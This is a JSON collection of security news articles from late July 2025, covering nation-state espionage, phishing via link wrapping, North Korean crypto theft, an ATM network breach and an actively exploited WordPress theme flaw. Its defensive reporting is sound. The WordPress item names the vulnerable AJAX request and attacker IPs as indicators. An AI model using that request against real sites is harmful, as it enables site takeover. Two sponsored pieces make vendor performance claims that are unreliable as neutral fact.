[
    {
        "Title": "Secret Blizzard Deploys Malware in ISP-Level AitM Attacks on Moscow Embassies",
        "Link": "https://thehackernews.com/2025/07/secret-blizzard-deploys-malware-in-isp.html",
        "Summary": "The Russian nation-state threat actor known as Secret Blizzard has been observed orchestrating a new cyber espionage campaign targeting foreign embassies located in Moscow by means of an adversary-in-the-middle (AitM) attack at the Internet Service Provider (ISP) level and delivering a custom malware dubbed ApolloShadow.\n\"ApolloShadow has the capability to install a trusted root certificate to",
        "Date": "2025-07-31",
        "Content": "The Russian nation-state threat actor known as\nSecret Blizzard\nhas been observed orchestrating a new cyber espionage campaign targeting foreign embassies located in Moscow by means of an adversary-in-the-middle (\nAitM\n) attack at the Internet Service Provider (ISP) level and delivering a custom malware dubbed ApolloShadow.\n\"ApolloShadow has the capability to install a trusted root certificate to trick devices into trusting malicious actor-controlled sites, enabling Secret Blizzard to maintain persistence on diplomatic devices, likely for intelligence collection,\" the Microsoft Threat Intelligence team\nsaid\nin a report shared with The Hacker News.\nThe activity is assessed to be ongoing since at least 2024, with the campaign posing a security risk to diplomatic personnel relying on local ISPs or telecommunications services in Russia.\nSecret Blizzard (formerly Krypton), affiliated with the Russian Federal Security Service, is also tracked by the broader cybersecurity community under the monikers Blue Python, Iron Hunter, Pensive Ursa, Snake, SUMMIT, Uroburos, Turla, Venomous Bear, and Waterbug.\nIn December 2024, Microsoft and Lumen Technologies Black Lotus Labs\ndisclosed\nthe hacking group's use of a Pakistan-based threat actor's command-and-control (C2) infrastructure to carry out its own attacks as a way to cloud attribution efforts.\nThe adversary has also been\nobserved\npiggybacking on malware associated with other threat actors to deliver its Kazuar backdoor on target devices located in Ukraine.\nThe Windows maker noted that the AitM position is likely facilitated by lawful intercept and includes the installation of root certificates under the guise of Kaspersky antivirus to obtain elevated access to the system.\nInitial access is achieved by redirecting target devices to threat actor-controlled infrastructure by putting them behind a\ncaptive portal\n, leading to the download and execution of the ApolloShadow malware.\n\"Once behind a captive portal, the Windows Test Connectivity Status Indicator is initiated—a legitimate service that determines whether a device has internet access by sending an HTTP GET request to hxxp://www.msftconnecttest[.]com/redirect, which should direct to msn[.]com,\" Microsoft said.\n\"Once the system opens the browser window to this address, the system is redirected to a separate actor-controlled domain that likely displays a certificate validation error, which prompts the target to download and execute ApolloShadow.\"\nThe malware then beacons host information to the C2 server and runs a binary called CertificateDB.exe should the device not be running on default administrative settings, and retrieves as a second-stage payload an unknown Visual Basic Script.\nIn the last step, the ApolloShadow process launches itself again and presents the user with a user access control (UAC) pop-up window and instructs them to grant it the highest privileges available to the user.\nApolloShadow's execution path varies if the running process is already running with sufficient elevated privileges, abusing them to set all networks to Private via registry profile changes and create an administrative user with the username UpdatusUser and a hard-coded password, allowing persistent access to the machine.\n\"This induces several changes, including allowing the host device to become discoverable, and relaxing firewall rules to enable file sharing,\" the company said. \"While we did not see any direct attempts for lateral movement, the main reason for these modifications is likely to reduce the difficulty of lateral movement on the network.\"\nOnce this step is successfully completed, victims are displayed a window showing that the deployment of the digital certificates is in progress, causing two root certificates to be installed on the machine using the certutil utility. Also dropped is a file called \"wincert.js\" that allows Mozilla Firefox to trust the root certificates.\nTo defend against Secret Blizzard activity, diplomatic entities operating in Moscow are urged to implement the principle of least privilege (PoLP), periodically review privileged groups, and route all traffic through an encrypted tunnel to a trusted network or use a virtual private network (VPN) service provider.\nFound this article interesting?  Follow us on\nGoogle News\n,\nTwitter\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Experts Detect Multi-Layer Redirect Tactic Used to Steal Microsoft 365 Login Credentials",
        "Link": "https://thehackernews.com/2025/07/experts-detect-multi-layer-redirect.html",
        "Summary": "Cybersecurity researchers have disclosed details of a new phishing campaign that conceals malicious payloads by abusing link wrapping services from Proofpoint and Intermedia to bypass defenses.\n\"Link wrapping is designed by vendors like Proofpoint to protect users by routing all clicked URLs through a scanning service, allowing them to block known malicious destinations at the moment of click,\"",
        "Date": "2025-07-31",
        "Content": "Cybersecurity researchers have disclosed details of a new phishing campaign that conceals malicious payloads by abusing link wrapping services from Proofpoint and Intermedia to bypass defenses.\n\"Link wrapping is designed by vendors like Proofpoint to protect users by routing all clicked URLs through a scanning service, allowing them to block known malicious destinations at the moment of click,\" the Cloudflare Email Security team\nsaid\n.\n\"While this is effective against known threats, attacks can still succeed if the wrapped link hasn't been flagged by the scanner at click time.\"\nThe activity, observed over the last two months, once again illustrates how threat actors find different ways to\nleverage legitimate features and trusted tools\nto their advantage and perform malicious actions, in this case, redirecting victims to Microsoft 365 phishing pages.\nIt's noteworthy that the abuse of link wrapping involves the attackers gaining unauthorized access to email accounts that already use the feature within an organization, so that any email message containing a malicious URL sent from that account is automatically rewritten with the wrapped link (e.g., urldefense.proofpoint[.]com/v2/url?u=<malicious_website>).\nAnother important aspect concerns what Cloudflare calls \"multi-tiered redirect abuse,\" in which the threat actors first cloak their malicious links using a URL shortening service like Bitly, and then send the shortened link in an email message via a Proofpoint-secured account, causing it to be obscured a second time.\nThis behavior effectively creates a redirection chain, where the URL passes through two levels of obfuscation – Bitly and Proofpoint's URL Defense – before taking the victim to the phishing page.\nIn the attacks observed by the web infrastructure company, the phishing messages masquerade as voicemail notifications, urging recipients to click on a link to listen to them, ultimately directing them to a bogus Microsoft 365 phishing page designed to capture their credentials.\nAlternate infection chains employ the same technique in emails that notify users of a supposed document received on Microsoft Teams and trick them into clicking on booby-trapped hyperlinks.\nA third variation of these attacks impersonates Teams in emails, claiming that they have unread messages and that they can click on the \"Reply in Teams\" button embedded in the messages to redirect them to credential harvesting pages.\n\"By cloaking malicious destinations with legitimate urldefense[.]proofpoint[.]com and url[.]emailprotection URLs, these phishing campaigns' abuse of trusted link wrapping services significantly increases the likelihood of a successful attack,\" Cloudflare said.\nThe development comes amid a\nspike\nin\nphishing\nattacks\nthat\nweaponize\nScalable Vector Graphics (\nSVG\n) files to\nget around\ntraditional anti-spam and anti-phishing protections and initiate multi-stage malware infections.\n\"Unlike JPEG or PNG files, SVG files are written in XML and support JavaScript and HTML code,\" the New Jersey Cybersecurity and Communications Integration Cell (NJCCIC)\nsaid\nlast month. \"They can contain scripts, hyperlinks, and interactive elements, which can be exploited by embedding malicious code within harmless SVG files.\"\nPhishing campaigns have also been observed embedding fake Zoom videoconferencing links in emails that, when clicked, trigger a redirection chain to a fake page that mimics a realistic-looking interface, after which they are served a \"meeting connection timed out\" message and taken to a phishing page that prompts them to enter their credentials to rejoin the meeting.\n\"Unfortunately, instead of 'rejoining,' the victim's credentials along with their IP address, country, and region are exfiltrated via Telegram, a messaging app notorious for 'secure, encrypted communications,' and inevitably sent to the threat actor,\" Cofense\nsaid\nin a recent report.\nFound this article interesting?  Follow us on\nGoogle News\n,\nTwitter\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "N. Korean Hackers Used Job Lures, Cloud Account Access, and Malware to Steal Millions in Crypto",
        "Link": "https://thehackernews.com/2025/07/n-korean-hackers-used-job-lures-cloud.html",
        "Summary": "The North Korea-linked threat actor known as UNC4899 has been attributed to attacks targeting two different organizations by approaching their employees via LinkedIn and Telegram.\n\"Under the guise of freelance opportunities for software development work, UNC4899 leveraged social engineering techniques to successfully convince the targeted employees to execute malicious Docker containers in their",
        "Date": "2025-07-31",
        "Content": "The North Korea-linked threat actor known as\nUNC4899\nhas been attributed to attacks targeting two different organizations by approaching their employees via LinkedIn and Telegram.\n\"Under the guise of freelance opportunities for software development work, UNC4899 leveraged social engineering techniques to successfully convince the targeted employees to execute malicious Docker containers in their respective workstations,\" Google's cloud division\nsaid\n[PDF] in its Cloud Threat Horizons Report for H2 2025.\nUNC4899\noverlaps\nwith activity tracked under the monikers Jade Sleet, PUKCHONG, Slow Pisces, and TraderTraitor. Active since at least 2020, the state-sponsored actor is known for its targeting of cryptocurrency and blockchain industries.\nNotably, the hacking group has been implicated in\nsignificant cryptocurrency heists\n, including that of Axie Infinity in March 2022 ($625 million), DMM Bitcoin in May 2024 ($308 million), and Bybit in February 2025 ($1.4 billion).\nAnother example that highlights its sophistication is the suspected exploitation of\nJumpCloud's infrastructure\nto target downstream customers within the cryptocurrency vertical.\nAccording to DTEX, TraderTraitor is affiliated with the Third Bureau (or Department) of North Korea's Reconnaissance General Bureau and is the most prolific of any of the Pyongyang hacking groups when it comes to cryptocurrency theft.\nAttacks mounted by the threat actor have entailed leveraging job-themed lures or\nuploading malicious npm packages\n, and then approaching employees at target companies with a lucrative opportunity or asking them to collaborate on a GitHub project that would then lead to the execution of the rogue npm libraries.\n\"TraderTraitor has demonstrated a sustained interest in cloud-centric and cloud-adjacent attack surfaces, often with a final goal of compromising companies that are customers of cloud platforms rather than the platforms themselves,\" cloud security firm Wiz\nsaid\nin a detailed report of TraderTraitor this week.\nThe attacks observed by Google Cloud targeted the respective organizations' Google Cloud and Amazon Web Services (AWS) environments, paving the way for a downloader called GLASSCANNON that's then used to serve backdoors like PLOTTWIST and MAZEWIRE that can establish connections with an attacker-controlled server.\nIn the incident involving the Google Cloud environment, the threat actors have been found to employ stolen credentials to interact remotely using Google Cloud CLI over an anonymous VPN service, carrying out extensive reconnaissance and credential theft activities. However, they were thwarted in their efforts due to the multi-factor authentication (MFA) configuration applied to the victim's credentials.\n\"UNC4899 eventually determined the victim's account had administrative privileges to the Google Cloud project and disabled the MFA requirements,\" Google said. \"After successfully gaining access to the targeted resources, they immediately re-enabled MFA to evade detection.\"\nThe intrusion targeting the second victim's AWS environment is said to have followed a similar playbook, only this time the attackers used long-term access keys obtained from an\nAWS credential file\nto interact remotely via AWS CLI.\nAlthough the threat actors ran into access control roadblocks that prevented them from performing any sensitive actions, Google said it found evidence that likely indicated the theft of the user's session cookies. These cookies were then used to identify relevant CloudFront configurations and S3 buckets.\nUNC4899 \"leveraged the inherent administrative permissions applied to their access to upload and replace existing JavaScript files with those containing malicious code, which were designed to manipulate cryptocurrency functions and trigger a transaction with the cryptocurrency wallet of a target organization,\" Google said.\nThe attacks, in both cases, ended with the threat actors successfully withdrawing several million worth of cryptocurrency, the company added.\nThe development comes as Sonatype said it flagged and blocked 234 unique malware npm and PyPI packages attributed to North Korea's Lazarus Group between January and July 2025. Some of these libraries are configured to drop a known credential stealer referred to as\nBeaverTail\n, which is associated with a long-running campaign dubbed Contagious Interview.\n\"These packages mimic popular developer tools but function as espionage implants, designed to steal secrets, profile hosts, and open persistent backdoors into critical infrastructure,\" the software supply chain security firm\nsaid\n. \"The surge of activity in H1 2025 demonstrates a strategic pivot: Lazarus is now embedding malware directly into open source package registries, namely npm and PyPI, at an alarming rate.\"\nFound this article interesting?  Follow us on\nGoogle News\n,\nTwitter\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "AI-Driven Trends in Endpoint Security: What the 2025 Gartner® Magic Quadrant™ Reveals",
        "Link": "https://thehackernews.com/2025/07/ai-driven-trends-in-endpoint-security.html",
        "Summary": "Cyber threats and attacks like ransomware continue to increase in volume and complexity with the endpoint typically being the most sought after and valued target. With the rapid expansion and adoption of AI, it is more critical than ever to ensure the endpoint is adequately secured by a platform capable of not just keeping pace, but staying ahead of an ever-evolving threat landscape.",
        "Date": "2025-07-31",
        "Content": "Cyber threats and attacks like ransomware continue to increase in volume and complexity with the endpoint typically being the most sought after and valued target. With the rapid expansion and adoption of AI, it is more critical than ever to ensure the endpoint is adequately secured by a platform capable of not just keeping pace, but staying ahead of an ever-evolving threat landscape.\nSentinelOne's steadfast commitment to delivering AI-powered cybersecurity enables global customers and partners to achieve resiliency and reduce risk with real-time, autonomous protection across the entire enterprise — all from a single agent and console with a robust, rigorously tested platform that keeps the customer in control.\nCybersecurity today isn't just about detection—it's about operational continuity under pressure. For example, endpoint solutions must account for encrypted traffic inspection, policy enforcement during identity compromise, and fast containment across distributed environments. These capabilities are especially critical in industries like healthcare or finance, where seconds can mean regulatory penalties or breached patient records.\nGartner recently named SentinelOne a Leader in the\n2025 Gartner® Magic Quadrant for Endpoint Protection Platforms\nfor the fifth consecutive year. This recognition builds on the Singularity Platform's momentum in innovation as the first solution with an AI analyst and the first unified platform delivering EDR, CNAPP, Hyperautomation, and SIEM to be FedRAMP High (the highest level of U.S. federal cloud security authorization) Authorized.\nSentinelOne provides protection for organizations of all sizes—from small businesses to global governments and enterprises—meeting their unique needs in the face of an increasingly complex cyber landscape. The Singularity Platform secures organizations across any device, any OS, and any cloud, providing industry-leading signal-to-noise so SOC teams can focus on responding as quickly as possible. With advanced XDR, AI SIEM, and CNAPP capabilities, a lightweight agent, and responsible architecture, SentinelOne offers a solution designed for both security and operational resiliency.\nOrganizations using\nSingularity Endpoint and Purple AI detect threats 63% faster, reduce MTTR by 55%\n, and lower the likelihood of a security incident by 60%. Customers have reported a 338% ROI over three years, maximizing the value of their security investments while strengthening their endpoint security.\nFor example, a healthcare provider using SentinelOne reported cutting incident response time by over 50% during a phishing-induced ransomware outbreak, thanks to automated rollback and unified visibility across cloud workloads and endpoints.\nMany teams searching for EDR or XDR platforms are trying to answer: \"Will this reduce alert fatigue?\" or \"Can it integrate with my SIEM or SOAR stack without more overhead?\" This is where automation must go beyond buzzwords—reducing manual triage, stitching disconnected signals, and working with existing tools instead of replacing them.\nSentinelOne has set the standard in modern endpoint protection since entering the market more than a decade ago, disrupting both traditional antivirus and early next-gen AV approaches.\nUnlike signature-based protection and cloud-dependent defenses, the platform pioneered the use of static and behavioral AI and machine learning to detect even novel techniques, solve for both online and air-gapped environments, and automate response. These innovations differentiate SentinelOne from traditional AV and even next-gen EDR solutions, offering deeper automation and on-device intelligence compared to competitors that rely heavily on cloud lookups or manual workflows.\nThis innovation, architecture, and design philosophy continues to evolve through Purple AI, advanced behavioral detection models, automated remediation and rollback, XDR capabilities, and more. The security platform now offers solutions spanning Identity, Cloud, AI SIEM, Hyperautomation, expert-managed detection and response, and a range of threat services.\nAccelerating the SOC and staying ahead of attacks in the age of AI requires platforms that harness innovation in AI and automation to radically improve detection, triage, and response. SentinelOne's platform has long embedded AI and automation as a foundational element. The company continues to develop accessible, compliant AI and automation to transform the SOC.\nBehavioral AI and the Future of Cyber Threat Detection\nOver the last decade, SentinelOne has advanced behavioral AI detections, automated remediation, and introduced agentic AI for security.\nRather than merely assisting analysts, agentic AI—defined as a class of autonomous AI systems capable of initiating and executing security actions without human prompting—autonomously takes action, handles routine tasks, and accelerates decision making while keeping the human operator in control.\nPurple AI, the platform's AI security analyst\n, translates natural language questions into powerful threat hunting queries, suggests follow-up questions, recommends next steps, and generates reports and email summaries to accelerate remediation. Built on the Open Cybersecurity Schema Framework (OCSF), a vendor-agnostic standard for unifying data models, Purple AI ensures unified visibility across all security data, enabling fast, precise threat detection.\nFigure 2: A natural language query using Purple AI to hunt for Privilege Escalation activity\nThis capability is integrated into Singularity Complete, SentinelOne's EDR solution, positioning Purple AI as a transformative force in SOC operations. By combining human insight with AI-level reasoning and automation, it enables faster, more accurate triage, investigation, threat management, and response.\nHow Endpoint Security Has Evolved in the Age of AI\nProduct innovation remains central to SentinelOne's strategy, driven by customer feedback, cost and time savings, and deep integration of AI and automation.\nDetects suspicious and malicious patterns in real time using behavioral and static AI models across servers, workstations, and workloads\nCorrelates telemetry data from endpoints, cloud workloads, and identity sources into detailed, visual Storylines\nFigure 3: Storyline helps security teams understand, investigate, and respond to threats faster and more effectively\nOffers one-click rollback to a pre-attack state, drastically reducing remediation time\nEnables custom workflows and incident response via Singularity Hyperautomation's no-code, drag-and-drop canvas\nSentinelOne also plays a central role in Zero Trust architectures, supporting identity-based segmentation and continuous trust evaluation across cloud, hybrid, and air-gapped environments. By aligning with frameworks like MITRE ATT&CK, OCSF, and NIST 800-207, the platform enables cohesive telemetry correlation and policy enforcement—positioning it as more than just endpoint protection, but a pillar in enterprise-wide cyber resilience.\nBalancing Control and Stability in Modern Cybersecurity Platforms\nThe Singularity Platform delivers simplicity, stability, and ease of use across various deployment environments—on-premises, hybrid, air-gapped, or fully cloud-based. SentinelOne offers comprehensive OS support, including legacy systems such as Windows XP, 2008, and 2012, and spans more than 20 years of Windows Server coverage.\nCustomer control is a cornerstone of the platform's philosophy. The multi-tenant management console emphasizes analyst experience, with streamlined deployment, configuration, and management. Updates are rigorously tested, responsibly deployed, and controlled by the customer to ensure stability and autonomy.\nAs recognized by Gartner in this year's evaluation, the unified agent and intuitive console deliver deep enterprise visibility while reducing overhead and administrative burden, allowing security teams to focus on high-priority tasks.\nEarning Industry Trust Through Proven Performance\nSentinelOne continues to lead in endpoint cybersecurity, earning trust from nearly 15,000 customers—including Fortune 10, Fortune 500, Global 2000 companies, and major government agencies. The company consistently achieves top results in MITRE ATT&CK Enterprise Evaluations, delivering an industry-leading signal-to-noise ratio.\nIn addition to being named a Leader in the\n2025 Gartner Magic Quadrant for Endpoint Protection Platforms\n, SentinelOne's Singularity Platform has been recognized as a 2025 Customers' Choice in the Voice of the Customer for Extended Detection and Response (XDR), a 2024 Customers' Choice for Cloud-Native Application Protection Platforms (CNAPP), and a 2024 Customers' Choice for Managed Detection and Response (MDR). SentinelOne was also named a Strong Performer in the 2025 Gartner Peer Insights Voice of the Customer for Cloud Security Posture Management tools (CSPM).\nTo see how SentinelOne can transform endpoint security within an organization, stakeholders can\nrequest a tailored demo\nor download the full Gartner report for detailed evaluation insights.\nGartner, Magic Quadrant for Endpoint Protection Platforms, Evgeny Mirolyubov, Franz Hinner, Deepak Mishra, July 14, 2025.\nGartner, Voice of the Customer for Extended Detection and Response, Peer Contributors, 23 May 2025.\nGartner, Voice of the Customer for Cloud-Native Application Protection Platforms, Peer Contributors, 27 December 2024.\nGartner, Voice of the Customer for Managed Detection and Response, Peer Contributors, 28 November 2024.\nGartner, Voice of the Customer for Cloud Security Posture Management Tools, Peer Contributors, 30 May 2025.\nGartner Disclaimer\nGARTNER is a registered trademark and service mark of Gartner, Inc. and/or its affiliates in the U.S. and internationally, MAGIC QUADRANT and PEER INSIGHTS are registered trademarks of Gartner, Inc. and/or its affiliates and are used herein with permission. All rights reserved.\nGartner does not endorse any vendor, product or service depicted in its research publications, and does not advise technology users to select only those vendors with the highest ratings or other designation. Gartner research publications consist of the opinions of Gartner's research organization and should not be construed as statements of fact. Gartner disclaims all warranties, expressed or implied, with respect to this research, including any warranties of merchantability or fitness for a particular purpose.\nGartner Peer Insights content consists of the opinions of individual end users based on their own experiences with the vendors listed on the platform, should not be construed as statements of fact, nor do they represent the views of Gartner or its affiliates. Gartner does not endorse any vendor, product or service depicted in this content nor makes any warranties, expressed or implied, with respect to this content, about its accuracy or completeness, including any warranties of merchantability or fitness for a particular purpose.\nFound this article interesting?\nThis article is a contributed piece from one of our valued partners.\nFollow us on\nGoogle News\n,\nTwitter\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "UNC2891 Breaches ATM Network via 4G Raspberry Pi, Tries CAKETAP Rootkit for Fraud",
        "Link": "https://thehackernews.com/2025/07/unc2891-breaches-atm-network-via-4g.html",
        "Summary": "The financially motivated threat actor known as UNC2891 has been observed targeting Automatic Teller Machine (ATM) infrastructure using a 4G-equipped Raspberry Pi as part of a covert attack.\nThe cyber-physical attack involved the adversary leveraging their physical access to install the Raspberry Pi device and have it connected directly to the same network switch as the ATM, effectively placing",
        "Date": "2025-07-31",
        "Content": "The financially motivated threat actor known as\nUNC2891\nhas been observed targeting Automatic Teller Machine (ATM) infrastructure using a 4G-equipped Raspberry Pi as part of a covert attack.\nThe cyber-physical attack involved the adversary leveraging their physical access to install the Raspberry Pi device and have it connected directly to the same network switch as the ATM, effectively placing it within the target bank's network, Group-IB said. It's currently not known how this access was obtained.\n\"The Raspberry Pi was equipped with a 4G modem, allowing remote access over mobile data,\" security researcher Nam Le Phuong\nsaid\nin a Wednesday report.\n\"Using the TINYSHELL backdoor, the attacker established an outbound command-and-control (C2) channel via a Dynamic DNS domain. This setup enabled continuous external access to the ATM network, completely bypassing perimeter firewalls and traditional network defenses.\"\nUNC2891 was\nfirst documented\nby Google-owned Mandiant in March 2022, linking the group to attacks targeting ATM switching networks to carry out unauthorized cash withdrawals at different banks using fraudulent cards.\nCentral to the operation was a kernel module rootkit dubbed CAKETAP that's designed to hide network connections, processes, and files, as well as intercept and spoof card and PIN verification messages from hardware security modules (HSMs) to enable financial fraud.\nThe hacking crew is assessed to share tactical overlaps with another threat actor called\nUNC1945\n(aka LightBasin), which was previously identified compromising managed service providers and striking targets within the financial and professional consulting industries.\nDescribing the threat actor as possessing extensive knowledge of Linux and Unix-based systems, Group-IB said its analysis uncovered backdoors named \"lightdm\" on the victim's network monitoring server that are designed to establish active connections to the Raspberry Pi and the internal Mail Server.\nThe attack is significant for the abuse of\nbind mounts\nto\nhide the presence\nof the backdoor from process listings and evade detection.\nThe end goal of the infection, as seen in the past, is to deploy the CAKETAP rootkit on the ATM switching server and facilitate fraudulent ATM cash withdrawals. However, the Singaporean company said the campaign was disrupted before the threat actor could inflict any serious damage.\n\"Even after the Raspberry Pi was discovered and removed, the attacker maintained internal access through a backdoor on the mail server,\" Group-IB said. \"The threat actor leveraged a Dynamic DNS domain for command-and-control.\"\nFound this article interesting?  Follow us on\nGoogle News\n,\nTwitter\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Alert Fatigue, Data Overload, and the Fall of Traditional SIEMs",
        "Link": "https://thehackernews.com/2025/07/alert-fatigue-data-overload-and-fall-of.html",
        "Summary": "Security Operations Centers (SOCs) are stretched to their limits. Log volumes are surging, threat landscapes are growing more complex, and security teams are chronically understaffed. Analysts face a daily battle with alert noise, fragmented tools, and incomplete data visibility. At the same time, more vendors are phasing out their on-premises SIEM solutions, encouraging migration to SaaS",
        "Date": "2025-07-31",
        "Content": "Security Operations Centers (SOCs)\nare stretched to their limits. Log volumes are surging, threat landscapes are growing more complex, and security teams are chronically understaffed. Analysts face a daily battle with alert noise, fragmented tools, and incomplete data visibility. At the same time, more vendors are phasing out their on-premises SIEM solutions, encouraging migration to SaaS models. But this transition often amplifies the inherent flaws of traditional SIEM architectures.\nT\nhe Log Deluge Meets Architectural Limits\nSIEMs are built to process log data—and the more, the better, or so the theory goes. In modern infrastructures, however, log-centric models are becoming a bottleneck. Cloud systems, OT networks, and dynamic workloads generate exponentially more telemetry, often redundant, unstructured, or in unreadable formats. SaaS-based SIEMs in particular face financial and technical constraints: pricing models based on events per second (EPS) or flows-per-minute (FPM) can drive exponential cost spikes and overwhelm analysts with thousands of irrelevant alerts.\nFurther limitations include protocol depth and flexibility. Modern cloud services like Azure AD frequently update log signature parameters, and static log collectors often miss these changes—leaving blind spots. In OT environments, proprietary protocols like Modbus or BACnet defy standard parsers, complicating or even preventing effective detection.\nFalse Positives: More Noise, Less Security\nUp to 30% of a SOC analyst's time is lost chasing false positives.\nThe root cause? Lack of context. SIEMs can correlate logs, but they don't \"understand\" them. A privileged login could be legitimate—or a breach. Without behavioral baselines or asset context, SIEMs either miss the signal or sound the alarm unnecessarily. This leads to analyst fatigue and slower incident response times.\nThe SaaS SIEM Dilemma: Compliance, Cost, and Complexity\nWhile SaaS-based SIEMs are marketed as a natural evolution, they often fall short of their on-prem predecessors in practice. Key gaps include incomplete parity in rule sets, integrations, and sensor support. Compliance issues add complexity, especially for finance, industry, or public sector organizations where data residency is non-negotiable.\nAnd then there's cost. Unlike appliance-based models with fixed licensing, SaaS SIEMs charge by data volume. Every incident surge becomes a billing surge—precisely when SOCs are under maximum stress.\nModern Alternatives: Metadata and Behavior Over Logs\nModern detection platforms focus on metadata analysis and behavioral modeling rather than scaling log ingestion. Network flows (NetFlow, IPFIX), DNS requests, proxy traffic, and authentication patterns can all reveal critical anomalies like lateral movement, abnormal cloud access, or compromised accounts without inspecting payloads.\nThese platforms operate without agents, sensors, or mirrored traffic. They extract and correlate existing telemetry, applying adaptive machine learning in real time—an approach already embraced by newer, lightweight\nNetwork Detection & Response (NDR)\nsolutions purpose-built for hybrid IT and OT environments. The result is fewer false positives, sharper alerts, and significantly less pressure on analysts.\nA New SOC Blueprint: Modular, Resilient, Scalable\nThe slow decline of traditional SIEMs signals the need for structural change. Modern SOCs are modular, distributing detection across specialized systems and decoupling analytics from centralized logging architectures. By integrating flow-based detection and behavior analytics into the stack, organizations gain both resilience and scalability—allowing analysts to focus on strategic tasks like triage and response\n.\nConclusion\nClassic SIEMs—whether on-prem or SaaS—are relics of a past that equated log volume with security. Today, success lies in smarter data selection, contextual processing, and intelligent automation. Metadata analytics, behavioral modeling, and machine-learning-based detection are not just technically superior—they represent a new operational model for the SOC. One that protects analysts, conserves resources, and exposes attackers sooner—especially when powered by modern, SIEM-independent NDR platforms.\nFound this article interesting?\nThis article is a contributed piece from one of our valued partners.\nFollow us on\nGoogle News\n,\nTwitter\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Hackers Exploit Critical WordPress Theme Flaw to Hijack Sites via Remote Plugin Install",
        "Link": "https://thehackernews.com/2025/07/hackers-exploit-critical-wordpress.html",
        "Summary": "Threat actors are actively exploiting a critical security flaw in \"Alone – Charity Multipurpose Non-profit WordPress Theme\" to take over susceptible sites.\nThe vulnerability, tracked as CVE-2025-5394, carries a CVSS score of 9.8. Security researcher Thái An has been credited with discovering and reporting the bug.\nAccording to Wordfence, the shortcoming relates to an arbitrary file upload",
        "Date": "2025-07-31",
        "Content": "Threat actors are actively exploiting a critical security flaw in \"\nAlone – Charity Multipurpose Non-profit WordPress Theme\n\" to take over susceptible sites.\nThe vulnerability, tracked as\nCVE-2025-5394\n, carries a CVSS score of 9.8. Security researcher Thái An has been credited with discovering and reporting the bug.\nAccording to Wordfence, the shortcoming relates to an arbitrary file upload affecting all versions of the plugin prior to and including 7.8.3. It has been addressed in version 7.8.5 released on June 16, 2025.\nCVE-2025-5394 is rooted in a plugin installation function named \"alone_import_pack_install_plugin()\" and stems from a missing capability check, thereby allowing unauthenticated users to deploy arbitrary plugins from remote sources via AJAX and achieve code execution.\n\"This vulnerability makes it possible for an unauthenticated attacker to upload arbitrary files to a vulnerable site and achieve remote code execution, which is typically leveraged for a complete site takeover,\" Wordfence's István Márton\nsaid\n.\nEvidence shows that CVE-2025-5394 began to be exploited starting July 12, two days before the vulnerability was publicly disclosed. This indicates that the threat actors behind the campaign may have been actively monitoring code changes for any newly addressed vulnerabilities.\nThe company said it has already blocked 120,900 exploit attempts targeting the flaw. The activity has originated from the following IP addresses -\n193.84.71.244\n87.120.92.24\n146.19.213.18\n185.159.158.108\n188.215.235.94\n146.70.10.25\n74.118.126.111\n62.133.47.18\n198.145.157.102\n2a0b:4141:820:752::2\nIn the observed attacks, the flaw is averaged to upload a ZIP archive (\"wp-classic-editor.zip\" or \"background-image-cropper.zip\") containing a PHP-based backdoor to execute remote commands and upload additional files. Also delivered are fully-featured file managers and backdoors capable of creating rogue administrator accounts.\nTo mitigate any potential threats, WordPress site owners using the theme are advised to apply the latest updates, check for any suspicious admin users, and scan logs for the request \"/wp-admin/admin-ajax.php?action=alone_import_pack_install_plugin.\"\nFound this article interesting?  Follow us on\nGoogle News\n,\nTwitter\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Kali Linux can now run in Apple containers on macOS systems",
        "Link": "https://www.bleepingcomputer.com/news/security/kali-linux-can-now-run-in-apple-containers-on-macos-systems/",
        "Summary": "Cybersecurity professionals and researchers can now launch Kali Linux in a virtualized container on macOS Sequoia using Apple's new containerization framework. [...]",
        "Date": "2025-07-31",
        "Content": "Cybersecurity professionals and researchers can now launch Kali Linux in a virtualized container on macOS Sequoia using Apple's new containerization framework.\nDuring WWDC 2025,\nApple announced\na new containerization framework that allows Apple Silicon hardware to run isolated Linux distros in its virtualized environment, similar to Microsoft Windows Subsystem for Linux 2 (WSL2).\nTo get started, users on macOS Sequoia with Apple Silicon can install the\ncontainer CLI\nvia Homebrew and initialize Apple's container framework:\nbrew install --cask container\r\ncontainer system start\nYou can then launch Kali Linux using the following command, which loads the container from the\nDockerHub container library\nand executes inside a macOS VM.\ncontainer run --rm -it kalilinux/kali-rolling\nYou can also use a container to mount a local directory into the Kali VM with a command like:\ncontainer run --remove --interactive --tty --volume $(pwd):/mnt --workdir /mnt docker.io/kalilinux/kali-rolling:latest\nThis command allows you to access files on the host device from within the container.\nHowever, there are some limitations to the new feature, as it's only available on Apple Silicon and does not support Intel Macs.\nAlso, the Kali team reports that there are some bugs with the new implementation around networking.\n\"Currently there are a\nfew known limitations of Containerization, especially using macOS \"Sequoia\" 15\n, such as\ncontainer's network access not getting an IP address or no network access\n,\" reads\nKali's announcement\n.\n\"We recommend reading and following Apple's advice if you run into these issues.\"\nCybersecurity professional Taha Ex\nalso warns\nthat some Kali use cases that require hardware passthrough will not work due to the container being isolated from hardware.\nThe ability to quickly launch Kali Linux in macOS, even if in a virtualized environment, and with some limitations, makes it easier for Mac users to perform security testing.\nThe Board Report Deck CISOs Actually Use\nCISOs know that getting board buy-in starts with a clear, strategic view of how cloud security drives business value.\nThis free, editable board report deck helps security leaders present risk, impact, and priorities in clear business terms. Turn security updates into meaningful conversations and faster decision-making in the boardroom.\nDownload the template to get started today\nRelated Articles:\nMicrosoft: macOS Sploitlight flaw leaks Apple Intelligence data\nApple fixes WebKit zero-day exploited in ‘extremely sophisticated’ attacks\nApple patches security flaw exploited in Chrome zero-day attacks\nAtomic macOS infostealer adds backdoor for persistent attacks\nNimDoor crypto-theft macOS malware revives itself when killed"
    },
    {
        "Title": "Microsoft to disable Excel workbook links to blocked file types",
        "Link": "https://www.bleepingcomputer.com/news/microsoft/microsoft-to-disable-external-workbook-links-to-blocked-file-types/",
        "Summary": "Microsoft has announced that it will start disabling external workbook links to blocked file types by default between October 2025 and July 2026. [...]",
        "Date": "2025-07-31",
